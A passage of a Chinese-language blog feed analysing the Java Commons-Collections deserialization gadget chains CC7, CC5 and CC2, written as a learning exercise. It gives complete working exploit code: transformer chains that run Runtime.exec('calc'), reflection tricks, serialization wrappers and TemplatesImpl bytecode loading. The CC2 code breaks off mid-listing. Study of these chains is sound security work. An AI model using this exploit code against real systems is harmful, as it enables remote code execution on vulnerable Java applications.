function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);</span><br><span class="line">        decorateMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">        decorateMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(decorateMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(decorateMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        decorateMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323025.png" alt="image-20250202220758678"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link" href="https://blog.nbcares.top/archives/CC7">Java_Commons-Collections 7(CC7) 学习过程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/">Java反序列化Commons-Collections篇08-CC7链 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
    <summary type="html">false</summary>
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-Commons-Collections 5利用链分析</title>
    <link href="http://example.com/2025/02/02/Java%E5%AE%89%E5%85%A8-Commons-Collections-5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2025/02/02/Java%E5%AE%89%E5%85%A8-Commons-Collections-5%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2025-02-02T15:18:46.000Z</published>
    <updated>2025-02-02T15:26:31.705Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>同CC1</p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022325769.png" alt="image-20250202145508986"></p><p>CC6的链子中有个调试问题就是<code>TiedMapEntry</code>的<code>toString</code>方法会调用<code>getValue</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022325656.png" alt="image-20250202141317321"></p><p>而<code>getValue</code>方法会调用<code>LazyMap</code>的<code>get</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022325709.png" alt="image-20250202141504686"></p><p>在CC5中就是直接通过<code>toString</code>来走<code>LazyMap</code>这条链</p><p>然后就是找谁调用了<code>TiedMapEntry</code>的<code>toString</code>，yso的官方链子入口类是<code>BadAttributeValueExpException</code>的<code>readObject</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022325783.png" alt="image-20250202141923831"></p><p>可以看到这里调用了<code>toString</code>，下面开始写Exp</p><h2 id="构造Exp"><a href="#构造Exp" class="headerlink" title="构造Exp"></a>构造Exp</h2><p>先写<code>toString</code>后面的部分</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line">        tiedMapEntry.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022325757.png" alt="image-20250202143617543"></p><p>再加上入口类<code>BadAttributeValueExpException</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(badAttributeValueExpException,tiedMapEntry);</span><br></pre></td></tr></table></figure></div><p>这里因为<code>BadAttributeValueExpException</code>类的<strong>构造函数</strong>会调用<code>toString</code>方法，所以我们构造时需要先随便赋一个值，然后再通过反射修改回<code>tiedMapEntry</code>，这样才能够使得反序列化的时候调用<code>TiedMapEntry</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022325743.png" alt="image-20250202144637899"></p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>最终Exp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.toString();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022325169.png" alt="image-20250202144547815"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link" href="https://blog.nbcares.top/archives/CC5">Java_Commons-Collections 5 (CC5)学习过程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8707-CC5%E9%93%BE/">Java反序列化Commons-Collections篇07-CC5链 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
    <summary type="html">false</summary>
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-Commons-Collections 2利用链分析</title>
    <link href="http://example.com/2025/01/26/Java%E5%AE%89%E5%85%A8-Commons-Collections-2%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2025/01/26/Java%E5%AE%89%E5%85%A8-Commons-Collections-2%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2025-01-26T12:44:48.000Z</published>
    <updated>2025-01-26T12:47:05.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>JDK8u65</li><li>openJDK 8u65</li><li>Maven3.6.3</li><li>Commons-Collections 4.0</li></ul><p>Maven下载Commons-Collections依赖</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>CC2是在CC4的基础上，不再使用<code>Transformer</code>数组，并且放弃使用<code>InstantiateTransformer</code>类将<code>TrAXFilter</code>初始化，而是从<code>TransformingComparator.compare</code>通过<code>InvokerTransformer.transform</code>调用<code>TemplatesImpl</code>来动态加载字节码。</p><p>流程图</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501262046102.png" alt="image-20250126181459592"></p><blockquote><p>难点在于<code>InvokerTransformer</code>的连接</p></blockquote><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从<code>Templates</code>往后</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>然后往前需要用<code>InvokerTransformer.transform</code>调用<code>TemplatesImpl.newTransformer</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501262046404.png" alt="image-20250126194828855"></p><p>构造反射</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure></div><p>从<code>InvokerTransformer</code>再往前就是<code>TransformingComparator.compare</code>了，也就是CC4的前半部分</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501262046119.png" alt="image-20250126195208325"></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">priorityQueue.add(templates);</span><br><span class="line">priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">transformingField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">transformingField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">transformingField.set(transformingComparator,invokerTransformer);</span><br></pre></td></tr></table></figure></div><p><strong>相较于CC4的变化</strong></p><ul><li>向队列里添加的第一个元素是我们前面创建的<code>TemplatesImpl</code>对象也就是<code>templates</code>，这是因为最后调用<code>Transformer.transform(obj1)</code>的时候用的是<strong>传入的第一个对象</strong>作为参数(也就是<strong>队列第一个元素</strong>)</li></ul><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501262046411.png" alt="image-20250126202151085" style="zoom:50%;"><ul><li>将<code>transformer</code>的值改为<code>invokerTransformer</code>，让<code>TransformingComparator</code>连接上<code>invokerTransformer</code></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>最终Exp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 